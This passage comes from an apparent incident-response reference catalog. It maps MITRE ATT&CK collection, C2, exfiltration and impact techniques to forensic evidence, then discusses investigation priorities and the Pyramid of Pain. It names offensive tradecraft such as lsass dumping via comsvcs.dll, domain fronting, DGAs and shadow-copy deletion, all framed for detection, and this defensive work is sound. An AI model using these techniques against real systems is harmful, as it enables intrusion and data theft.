- **T1056.004 Credential API Hooking.** Implants hooking LsaLogonUser.

### T1113 — Screen Capture
- `BitBlt` calls, screenshot tools. PowerShell `Add-Type` to import GDI.

### T1115 — Clipboard Data
- Browser-injected clippers (banking trojans) reading clipboard for crypto addresses.

### T1123 — Audio Capture
- Microphone API; `wmplayer`-style components.

### T1185 — Browser Session Hijacking
- Browser process injection; cookie theft.

---

## Command and Control (TA0011)

### T1071 — Application Layer Protocol
- **T1071.001 Web Protocols (HTTP/HTTPS).** Most beacons. Detection: domain reputation, TLS JA3/JA4 fingerprint, beacon timing analysis.
- **T1071.002 File Transfer Protocols.** FTP, FTPS, SFTP.
- **T1071.003 Mail Protocols.** SMTP/IMAP exfil or C2.
- **T1071.004 DNS.** DNS tunneling — long subdomain labels, high query volume to single domain. Sysmon EID 22 (DnsQuery).

### T1090 — Proxy
- **T1090.001 Internal Proxy.** SOCKS / HTTP proxy on compromised host as pivot.
- **T1090.002 External Proxy.** Public anonymizing proxy.
- **T1090.003 Multi-hop Proxy.** Tor, VPN chains.
- **T1090.004 Domain Fronting.** TLS SNI mismatched from HTTP Host header to hide C2 destination behind CDN.

### T1095 — Non-Application Layer Protocol
- ICMP tunneling, raw TCP/UDP C2.

### T1102 — Web Service
- **T1102.001 Dead Drop Resolver.** Posting C2 address to a public site (Twitter, Pastebin, GitHub Gist) then reading it.
- **T1102.002 Bidirectional Communication.** Using a legitimate web service for both directions.
- **T1102.003 One-Way Communication.**

### T1568 — Dynamic Resolution
- **T1568.001 Fast Flux DNS.** Short-TTL records with many rotating IPs.
- **T1568.002 Domain Generation Algorithms.** DGA. Detection: NX domain bursts (DGAs typically miss), high-entropy domain names.
- **T1568.003 DNS Calculation.** Algorithmically chosen DNS records.

### T1573 — Encrypted Channel
- **T1573.001 Symmetric Cryptography.**
- **T1573.002 Asymmetric Cryptography.**
- **Evidence.** TLS metadata (JA3/JA4 fingerprint), certificate analysis (self-signed, recently-issued, abnormal Subject).

---

## Exfiltration (TA0010)

### T1041 — Exfiltration Over C2 Channel
- Data leaves through the same C2 the implant uses. Volume increase in C2 traffic.

### T1048 — Exfiltration Over Alternative Protocol
- **T1048.001 Symmetric Encrypted.**
- **T1048.002 Asymmetric Encrypted.**
- **T1048.003 Unencrypted.**
- **Evidence.** New protocols not seen on the host (FTP from a workstation), large outbound volumes, RClone with cloud destinations.

### T1052 — Exfiltration Over Physical Medium
- **T1052.001 USB.** Common insider vector. See playbook #6.

---

## Impact (TA0040)

### T1486 — Data Encrypted for Impact
- Ransomware encryption. See playbook #1.
- **Evidence.** Mass file extension change in USN $J; ransom note creation; high CPU usage from encryptor process.

### T1485 — Data Destruction
- Wipers (NotPetya, WhisperGate, HermeticWiper, CaddyWiper). Mass file truncation/overwrite; MBR/VBR destruction.

### T1490 — Inhibit System Recovery
- See catalog #20 — vssadmin/bcdedit/wbadmin. The diagnostic pair for ransomware predictors.

### T1561 — Disk Wipe
- **T1561.001 Disk Content Wipe.**
- **T1561.002 Disk Structure Wipe.** MBR/GPT/VBR damage.

---

## Tactic-level note — what gets prioritized in a real engagement

The 14 tactics aren't equally important per engagement. A senior IR consultant's mental ranking on first-look depends on what the client said:

- **"We saw weird logon."** → Focus on Initial Access + Persistence + Credential Access first.
- **"Files are encrypted."** → Backwards from Impact → Defense Evasion (vssadmin / Defender disable) → Privilege Escalation → Persistence (still active?) → Initial Access (how did they get in?).
- **"We saw a beacon."** → C2 + Defense Evasion + Persistence; then work the chain back.
- **"Data was stolen."** → Exfiltration → Collection → Credential Access (whose account?) → Initial Access.
- **"Insider risk."** → Collection + Exfiltration + Persistence (did they leave a way back?).

The ATT&CK matrix maps to a workflow when used backwards from the strongest signal. Each tactic answers a different question and the priority depends on what's known versus what's hypothesized.

**Sub-technique granularity matters.** "T1059 Command and Scripting Interpreter" is too broad to be actionable in a report; "T1059.001 PowerShell with EncodedCommand argument launched by Outlook.exe" is. The drift from technique-level reporting (which says little) to sub-technique-with-evidence reporting (which says everything) is one of the markers of a mature IR practice. The MITRE Center for Threat Informed Defense's "ATT&CK Workbench" and "Top ATT&CK Techniques" project keep prioritized lists of which sub-techniques appear most frequently across reported incidents — useful baseline for what to look for first.

---

## Pyramid of Pain in practice

David Bianco's Pyramid of Pain (2013) ranks adversary indicators by how painful they are for the attacker to change:

1. **Hash values** — trivial. Recompile; one byte changes; new hash.
2. **IP addresses** — easy. New VPS, new IP.
3. **Domain names** — easy-moderate. Register a new one, rotate DGAs.
4. **Network/Host artifacts** — annoying. Mutex names, registry keys, file paths — changing these requires changing the implant.
5. **Tools** — challenging. Different tooling means retraining operators.
6. **TTPs (Tactics, Techniques, Procedures)** — tough!! Tradecraft change requires the attacker to retool their entire methodology.

**What this means for forensic work.**

Hash-level findings answer "did this specific binary run here?" Useful for one-off detection. Useless for adversary attribution and useless for predicting what they'll do next campaign — they'll change hashes between every job.

TTP-level findings answer "what does the adversary's standard operating shape look like?" When you can say "this incident matches the FIN7 spearphish → POWERSHELL → SQL Server → PERSISTENCE pattern, with the BumbleBee loader and TIRION beacon," the conclusion survives:
- The hash rotating
- The IP / domain rotating
- The file path rotating
- The specific tool being swapped to a sibling tool

Because the *shape* is what's hard to change.

For an IR report, this is the difference between:

> "We observed `update.exe` (SHA-256: abcd...) on the host."

and:

> "We observed a Cobalt Strike beacon reflectively loaded into `svchost.exe`, communicating with `*.cloudfront.net` C2 on a 30-second beacon with jitter, preceded by an Office spearphish (T1566.001) that spawned `powershell.exe` with an `-EncodedCommand` argument (T1059.001 + T1027), credential dumping from `lsass.exe` via `comsvcs.dll` MiniDump (T1003.001), and lateral movement via PsExec (T1021.002) to four file servers. Pattern is consistent with [actor group X] historical TTPs (citations to Mandiant/CrowdStrike reports)."

The second statement survives adversary rotation. The first does not.

**Why this matters for the SilentWitness wedge.** A report whose claims tie to artifact-level evidence (Event ID 4663 on this LSASS handle at this timestamp, with this process tree, with this command line) is defensible in cross-examination. A report whose claims tie only to hashes is defeated the moment the attacker recompiles. The whole forensic enterprise — and the legal one downstream — runs on the TTP layer of the pyramid. Hash matches are a confirming detail, not the spine.

---

## Closing — what this catalog is good for

Every technique in Part A and every playbook in Part B is a *known shape*. A senior IR consultant looking at a fresh case forms hypotheses ranked by:

1. **Base rate.** Ransomware is everywhere; insider exfil is rare-but-impactful; UEFI implants are exotic. Start where the volume is.
2. **Artifact signature density.** Some shapes (PsExec, vssadmin delete shadows, EID 4624 type 10 from unexpected source) are pattern-rich and easy to confirm or rule out in minutes. Others (in-memory beacon with no disk artifacts) require memory acquisition.
3. **What the asks are.** The client says "find out how they got in" → start with Initial Access patterns; "find out what they took" → start with Collection + Exfiltration; "is the adversary still here" → start with Persistence + C2 still-beaconing.

The patterns above are the recognition catalog. The artifacts in `02-windows-artifacts-encyclopedia.md` and `04-disk-network-log-forensics-deep.md` are the recipes for proving each one. The tools in `06-sift-toolchain-deep.md` are the kitchen. This document is the cookbook of dishes.

---

**References (selected primary sources used in compiling this document).**

- MITRE ATT&CK matrix, attack.mitre.org (Enterprise v15 / 2024 + v16 / 2025).
- MITRE D3FEND, d3fend.mitre.org.
- LOLBAS Project, lolbas-project.github.io.
- LOLDrivers, loldrivers.io.
- HijackLibs, hijacklibs.net.
- Atomic Red Team, atomicredteam.io.
- Mandiant M-Trends 2024, 2025.
- CrowdStrike Global Threat Report 2024, 2025.
- Microsoft Threat Intelligence Center reports (MSTIC).
- Cybereason research blog (DeadRinger, GhostShell, Operation CuckooBees).
- SentinelOne LabsBlog (LokiBot, modular malware deep-dives).
- Anthropic Threat Intelligence Report, November 2025 — GTG-1002.
- Stephen Fewer, "Reflective DLL Injection" (HarmonySecurity, 2008).
- Casey Smith ("subTee"), Squiblydoo / regsvr32 abuse research (2016).
- enSilo, Process Doppelgänging disclosure (Black Hat Europe 2017).
- Will Burgess / Christopher Glyer / Daniel Bohannon, SpecterOps & FireEye research on PowerShell obfuscation, Active Directory attacks.
- Eric Zimmerman, ShimCache and Amcache research (multiple papers); EvtxECmd, MFTECmd, ShellBagsExplorer.
- Willi Ballenthin, EVTXtract / python-evtx; VBA macro research.
- Andrew Case et al., Volatility 3 plugin documentation, volatilityfoundation.org.
- SpecterOps "Certified Pre-Owned" paper, Will Schroeder + Lee Christensen (2021) — AD CS abuse paths.
- Sean Metcalf, AdSecurity.org — comprehensive AD attack catalog.
- Microsoft Security Response Center — quarterly threat intelligence reports.
- SANS DFIR Summit talks (Rob T. Lee, Phil Hagen, Mari DeGrazia, Chad Tilbury — multiple years).
- US-CERT / CISA advisories — SolarWinds, MOVEit, log4j post-mortems.
